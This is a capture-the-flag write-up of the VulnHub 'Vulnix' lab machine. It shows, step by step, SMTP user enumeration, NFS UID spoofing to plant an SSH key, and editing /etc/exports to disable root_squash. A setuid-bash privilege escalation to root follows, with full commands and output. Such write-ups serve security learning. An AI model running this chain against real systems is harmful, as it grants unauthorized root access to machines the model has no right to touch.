### Vulnix Writeup
Today it's the Vulnix machine by Rebootuser which you can find hosted at https://www.vulnhub.com/entry/hacklab-vulnix,48/

We start off with the usual nmap scan and get a few random services and no web server on this one.
```
nmap -v -sV -Pn -n 192.168.147.158 
```

```
PORT     STATE SERVICE  VERSION                    
22/tcp   open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)                    
25/tcp   open  smtp     Postfix smtpd                                                                 
79/tcp   open  finger   Linux fingerd                                                                 
110/tcp  open  pop3     Dovecot pop3d                                                                 
111/tcp  open  rpcbind  2-4 (RPC #100000)          
143/tcp  open  imap     Dovecot imapd                                                                 
512/tcp  open  exec     netkit-rsh rexecd          
513/tcp  open  login?                              
514/tcp  open  shell    Netkit rshd                
993/tcp  open  ssl/imap Dovecot imapd                                                                 
995/tcp  open  ssl/pop3 Dovecot pop3d                                                                 
2049/tcp open  nfs_acl  2-3 (RPC #100227)  
```
Some interesting things here, first off the nfs running on 2049 shows us a possible user named vulnix.
```
root@sushi:~# showmount -e 192.168.147.158
Export list for 192.168.147.158:
/home/vulnix *
```
So we check it on the SMTP and yes that is a valid user.
```
root@sushi:~# nc -nv 192.168.147.158 25
(UNKNOWN) [192.168.147.158] 25 (smtp) open

220 vulnix ESMTP Postfix (Ubuntu)
500 5.5.2 Error: bad syntax
VRFY vulnix
252 2.0.0 vulnix
VRFY root
252 2.0.0 root
VRFY crappy
550 5.1.1 <crappy>: Recipient address rejected: User unknown in local recipient table
^C
```
What is in Vulnix's home folder? We try mounting it and if we force it to use nfs version 3 or lower we can see the UID and GID for the owner is 2008 which we will need in a second.
```
root@sushi:/mnt# mount 192.168.147.158:/home/vulnix vulnix -o vers=3
root@sushi:/mnt# ls -l
total 12
drwxr-xr-x 2 root root 4096 Dec 20 20:26 jail
drwxr-xr-x 2 root root 4096 Dec 20 20:27 opt
drwxr-x--- 2 2008 2008 4096 Sep  2  2012 vulnix
root@sushi:/mnt# cd vulnix
bash: cd: vulnix: Permission denied
```
Awesome we can't actually access the folder, but I'm assuming if we have a user named vulnix with the same UID then it won't be a problem.
```
root@sushi:/mnt# useradd -u 2008 vulnix
root@sushi:/mnt# su vulnix
$ id
uid=2008(vulnix) gid=2008(vulnix) groups=2008(vulnix)
$ cd vulnix
$ ls -lah
total 20K
drwxr-x--- 2 vulnix vulnix 4.0K Sep  2  2012 .
drwxr-xr-x 5 root   root   4.0K Mar 18 20:24 ..
-rw-r--r-- 1 vulnix vulnix  220 Apr  3  2012 .bash_logout
-rw-r--r-- 1 vulnix vulnix 3.5K Apr  3  2012 .bashrc
-rw-r--r-- 1 vulnix vulnix  675 Apr  3  2012 .profile
```
Nothing really in there, lets create some ssh keys and add the public key to the vulnix users authorized_keys.
```
root@sushi:/# ssh-keygen                           
Generating public/private rsa key pair.            
Enter file in which to save the key (/root/.ssh/id_rsa):                                              
Enter passphrase (empty for no passphrase):        
Enter same passphrase again:                       
Your identification has been saved in /root/.ssh/id_rsa.                                              
Your public key has been saved in /root/.ssh/id_rsa.pub.                                              
The key fingerprint is:                            
SHA256:SsY11VtkZekosDWAc+sMetO6J5GLsnWAkQgdNxaTRAk root@sushi                                         
The key's randomart image is:                      
+---[RSA 2048]----+                                
|..E=O+  ..o. .o.+|                                
|. oo+o o + o...o |                                
| . o    = = .oo  |                                
|    o. o + ... . |                                
|   . .= S   .    |                                
|     +.* +       |                                
|     .+.=        |                                
|   ....+ .       |                                
|   .o  .+        |                                
+----[SHA256]-----+                                
root@sushi:~# cd /root/.ssh                              
root@sushi:~/.ssh# ls                              
id_rsa  id_rsa.pub  known_hosts                    
root@sushi:~/.ssh# su vulnix                       
$ cd /mnt/vulnix                                   
$ mkdir .ssh                                       
$ cd .ssh                                          
$ echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDtV4eYiSqrw0sfD2Plm+AFfS99c5BsN4Xc67xWiIcN9gqxk8V/x3AGEUwLNNuAPAu/+inDQkv5HdKJwL56cgKKzDpeNtVaMwd8z3Xx1mHercAeIjyyYdl5HHxDgId23QIfgGJByFTLM77tRuJCiCPG/2EaCaAaykaIiobKorI2ujc61Z3Guzja/DXzSzmnGzeG/zSopdkRuUHu1ywQqj2D8GoJob4SL67juspotBA2DBX37nPpOvvy0drqK0z6UlyUj+ChZh8c15zOftJJuD4pImXKKX5T/pxprockcpCyUAQNw2Q+Ug5KgMo6g9WvwNAKXMOgDWDT5DKuAqjgmm1/ root@sushi > authorized_keys                                             
$                                                  
```
And then we can ssh onto the box with the vulnix account nice.
```
root@sushi:~/.ssh# ssh vulnix@192.168.147.158      
The authenticity of host '192.168.147.158 (192.168.147.158)' can't be established.                    
ECDSA key fingerprint is SHA256:IGOuLMZRTuUvY58a8TN+ef/1zyRCAHk0qYP4wMViOAg.                          
Are you sure you want to continue connecting (yes/no)? yes                                            
Warning: Permanently added '192.168.147.158' (ECDSA) to the list of known hosts.                      
Welcome to Ubuntu 12.04.1 LTS (GNU/Linux 3.2.0-29-generic-pae i686)                                   

 * Documentation:  https://help.ubuntu.com/        

  System information as of Sun Mar 18 17:35:22 GMT 2018                                               

  System load:  0.0              Processes:           89                                              
  Usage of /:   90.2% of 773MB   Users logged in:     0                                               
  Memory usage: 7%               IP address for eth0: 192.168.147.158                                 
  Swap usage:   0%                                 

  => / is using 90.2% of 773MB                     

  Graph this data and manage this system at https://landscape.canonical.com/                          


The programs included with the Ubuntu system are free software;                                       
the exact distribution terms for each program are described in the                                    
individual files in /usr/share/doc/*/copyright.    

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by                                  
applicable law.                                    

vulnix@vulnix:~$ uname -a
Linux vulnix 3.2.0-29-generic-pae #46-Ubuntu SMP Fri Jul 27 17:25:43 UTC 2012 i686 athlon i386 GNU/Linux
```
So first off we check if this account can do anything with sudo, and we can run sudoedit on the exports file good deal.
```
vulnix@vulnix:~$ sudo -l
Matching 'Defaults' entries for vulnix on this host:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User vulnix may run the following commands on this host:
    (root) sudoedit /etc/exports, (root) NOPASSWD: sudoedit /etc/exports
```
Looking at /etc/exports, we can disable the root_squashing for the vulnix home folder which will allow us to copy something like bash and give it setuid permissions. We could also add roots home folder to the /etc/exports with no_root_squash and echo in our ssh key to his authorized_keys and get root access that way.
```
# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/home/vulnix    *(rw,no_root_squash)
```
So the next step really tripped me up as I'm just not used to doing this for these vm's, but to get the config change to take effect we have to actually reboot the machine. Remember to unmount the home folder also or it will take forever. When it's back up, we mount the home directory again and copy over /bin/bash.
```
root@sushi:/mnt# mount 192.168.147.158:/home/vulnix vulnix -o vers=3
root@sushi:/mnt# cd vulnix
root@sushi:/mnt/vulnix# cp /bin/bash .
root@sushi:/mnt/vulnix# chmod 4777 bash
root@sushi:/mnt/vulnix# ls -lah                    
total 1.3M                                         
drwxr-x--- 4 vulnix vulnix 4.0K Mar 18 14:16 .     
drwxr-xr-x 5 root   root   4.0K Mar 18 21:09 ..    
-rwsrwxrwx 1 root   root   1.3M Mar 18 14:16 bash  
-rw-r--r-- 1 vulnix vulnix  220 Apr  3  2012 .bash_logout                       
-rw-r--r-- 1 vulnix vulnix 3.5K Apr  3  2012 .bashrc                            
drwx------ 2 vulnix vulnix 4.0K Mar 18 13:35 .cache
-rw-r--r-- 1 vulnix vulnix  675 Apr  3  2012 .profile                           
drwxr-xr-x 2 vulnix vulnix 4.0K Mar 18 13:34 .ssh  
```
Then back in our ssh session as the vulnix user, we just run bash in the home folder with the -p flag to preserve file permissions.
```
vulnix@vulnix:~$ id                                
uid=2008(vulnix) gid=2008(vulnix) groups=2008(vulnix)                                                 
vulnix@vulnix:~$ ./bash -p                         
./bash: /lib/i386-linux-gnu/libtinfo.so.5: no version information available (required by ./bash)
bash-4.4# id                                       
uid=2008(vulnix) gid=2008(vulnix) euid=0(root) groups=0(root),2008(vulnix)                            
bash-4.4# cd /root                                 
bash-4.4# ls                                       
trophy.txt                                         
bash-4.4# cat trophy.txt                           
cc614640424f5bd60ce5d5264899c3be                   
```
That was a good one for sure, having to reboot the machine was different and the rest of it was interesting learning a bit about and using nfs for the first time in awhile.  As always thanks to VulnHub and Rebootuser for all the hard work.


